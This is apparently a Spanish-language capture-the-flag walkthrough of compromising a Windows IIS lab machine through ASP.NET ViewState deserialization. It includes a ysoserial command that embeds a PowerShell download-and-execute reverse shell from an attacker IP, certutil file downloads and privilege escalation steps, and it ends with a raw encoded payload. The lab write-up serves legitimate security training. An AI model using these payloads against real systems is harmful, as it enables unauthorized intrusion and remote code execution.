### Ping
```python
ping -c 1 10.10.11.251
PING 10.10.11.251 (10.10.11.251) 56(84) bytes of data.
64 bytes from 10.10.11.251: icmp_seq=1 ttl=127 time=157 ms

--- 10.10.11.251 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.729/156.729/156.729/0.000 ms
```

### TTL 127= Windows
### nmap
```python
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
```
obtenemos el nombre de dominio del host y lo agregamos al /etc/hosts

### Enumeración del puerto http (80)

![[Pasted image 20240310205202.png]]

### Fuzzing con wfuzz (Directorios)
no obtenemos nada interesante por el momento
![[Pasted image 20240310205503.png]]

### Fuzzing con wfuzz (Subdominios)
encontramos un subdominio sospechoso. lo agregamos al /etc/hosts
![[Pasted image 20240310210838.png]]

### Web dev.pov.htb

![[Pasted image 20240311105847.png]]

### BurpSuite
interceptamos la petición de download cv
![[Pasted image 20240310212727.png]]
cambiamos el EVENTVALIDATION= cv.pdf por = /web.config. esto nos muestra información de la pagina la cual la hace vulnerable a una explotacion de VIEWSTATE

### Vulnerabilidad Exploiting __VIEWSTATE
![[Pasted image 20240311105353.png]]
usaremos la herramienta YSoSerial.Net esta herramienta es para maquina windows asi que debes tener una maquina windows donde poder ejecutar esto (tambien puedes ejecutarlo desde kali linux pero debes complementarlo con otras herramientas)

### YSoSerial.Net
usaremos la siguiente sintax
```python
C:\FilesExplotation\ysoserial-1.34\Release>.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.64/Invoke-PowerShellTcp.ps1')" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![[Pasted image 20240311110529.png]]

### Invoke-PowerShelltcp
ahora usaremos el invoke-powershell para invocar automaticamente esta shell. al final del codigo debemos agregar la siguiente linea 

```python
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

![[Pasted image 20240311110955.png]]

### Servidor con python
estaremos compartiendo este archivo en un servidor con python
![[Pasted image 20240311110845.png]]

### BurpSuite
finalmente usaremos el codigo que hemos generado con el YSoSerial.Net intectandolo en el parametro **VIESTATE** 
Nota: el codigo debe ir URLEncode puede hacerlo desde burpsuite seleccionando el codigo y presionando CTRL + U 
![[Pasted image 20240311111432.png]]
### rlwrap
estaremos a la escucha con rlwrap para recibir nuestra reverse shell
![[Pasted image 20240311105747.png]]

### xml

![[Pasted image 20240311112314.png]]
En este archivo obtenemos otro Usuario llamado **alaading** y la contraseña codificada.

### Import-Clixml 
con import-clixml podemos extraer los datos de ese archivo xml
![[Pasted image 20240311175136.png]]

### Servidor con python 
ahora vamos a descargar RunasCs.exe, psgetsys.ps1 y EnableAllTokenPrivs.ps1
estaremos compartiendo todos estos archivos en nuestro servidor para poder subirlos a la maquina victima
![[Pasted image 20240311181743.png]]

### certutil.exe
usaremos la herramienta certutil para poder descargar los archivos a la maquina victima
```python
certutil.exe -urlcache -split -f "http://10.10.14.64/RunasCs.exe" ".\RunasCs.exe"
```
![[Pasted image 20240311182044.png]]

### RunasCs.exe
ejecutamos RunasCs con las credenciales que hemos conseguido llamamos una cmd.exe en nuestra dirección IP y el puerto
![[Pasted image 20240311182556.png]]

### rlwrap 
hemos conseguido una nueva conexión con las credenciales de alaading
![[Pasted image 20240311183935.png]]

### Escalada de privilegios
podemos ver que el privilegio "SeDebugPrivilege" ha sido deshabilitado
![[Pasted image 20240311184829.png]]

### sfitz
ejecutamos los script que hemos subido anteriormente y procedemos a la escalada 
![[Pasted image 20240311190250.png]]

### msfvenom
creamos un exploit con msfvenom para iniciar una reverse shell como nt\system y lo vamos a subir a la maquina victima con un servidor en python
![[Pasted image 20240311190718.png]]

### 

R0joNK0xfsrbj6hXJWsdR/Aunc4iwYQieYABw5V7xxaSmzHkgHGwy8/AWpbhGk%2btq7aHLsakG6Kx9X2YOZxoalUFpgLGQI0SMMt7REc9UhPTx7RwQYJ5F%2bG%2bPIrF4an95Wm4TzN1afxXl21Ks6gAr7aksLZLuM%2bqQmqWIYlRcmt7qepwSKsTQIXeij0Z3yvleKl0akkk11hY5u0Fd5iyhs1gSYksM2ad6klvG45l0KrdWndWl1yrV1OtImsSOpytC9UMkjYt3LCauyIVH3YmFFXFgFekDZpIO3UsNHxvNa/P69N24/V6jW4/H1BPh63/itiV72Z1QchzB5O4m2gwZt%2bmLZ2jkO%2b3nZRJvjYVk6S5B4VT/ava6Fk/n9UpbEym4nDri9O4QIYKnnNVyYrAkXHnKy4yKqtUBvsOqhIJjJ1VxT/SUGMMYi%2bEM/IhRiLUnUUjxgdPwXlpD2tXiZ4N6khYWNVAF6LqWv3uU3lmIFHx62PC7mR4NU5HXrl3t0Nc%2b/9%2bNIv2GpKzmt7dGO/hylmavRws7K4FOUEcgdZIqwkL3uUBpnMjR64ZB2aJMwtS4e4Y9W2NmH8Kn91cso7ZF523BHvgKANoK9crhHQnskUhQwEsmhb1FZnGs6V/1vfHUb29IJf44nPFJiGq2JFAl9%2bok1L33RUcQISatYQ5vFYRztgtePj57VsHcfS7462S6owQeflANXz5rYigDmN6zImGfsxQRbG3VoJV%2bS6V6/9xrLUaNzrgI5HmlQY3AGBANhwVD71BffEd8aHVTNaNrV4WLs6IoqZ5P/HBRMt20/TjAK07j6ri%2bUYrftMnbJXlxJAjHKOO7PXhHG2unVQb4TDDxvf9DUg/y6k5WQhr9X9iS2fEU5C8HQ97qbDezYwXNe2v0D3Bw%2bMSikiaQjpBypzQP1AtHwOB0H3H59fpYth5KYsWhVG1oACZDuhcwt6e6%2b8cfszTs7NuvBXqzcjPFWZKypB6xAFp47MFe62KaHLhUHAW1eK78ao/yz2jobzW2KUSWEERFfbHZJFmhjPBopkpjHXqnYUIW691RnZuUQpwVYqfTqGbXTNYfG2Q46hYCsLLES%2bL36EVj0PSq1etuAFFP/PWL05YndONUON5ZiyoP/laheq4VDVbKNwZ9EbQuBKhTCXnex463y6ROeY7tYuEDL4lVrQXgxaJ9I%2bikuZJZBze8TUf3Tq0PAUa9kHCxnnJOzb/dPBjHNVQSGo8NmS2Fwa8mJRLHWrjDVYDuje7Zr3A%2bLnldFnSrDRK2qY%2bJnslZGTtL2ZduI83eBGN2nWJxQ2z4FEjq5J8Ux3a3oJ1%2bmMUs3trMQLV8uZSv2Bfc4z2YG2SKpg615CcmGs9AaoCvzdDCnVu0fUkSCeeI94q9cpGmb2XGg%2bUbqVrGwp7gYYu2A%3d%3d